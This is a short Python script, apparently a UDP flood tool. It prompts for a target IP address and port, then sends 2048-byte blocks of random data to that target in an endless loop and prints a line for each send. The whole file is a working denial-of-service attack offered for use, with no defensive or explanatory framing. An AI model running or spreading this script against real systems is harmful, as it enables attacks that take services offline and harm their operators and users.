import socket
import random

target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port number: "))

# Creates a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Creates a payload of random bytes
payload = random._urandom(2048)

while True:
    # Sends payload to target
    sock.sendto(payload, (target_ip, target_port))
    print(f"Sending {len(payload)} bytes of data to {target_ip}:{target_port}")
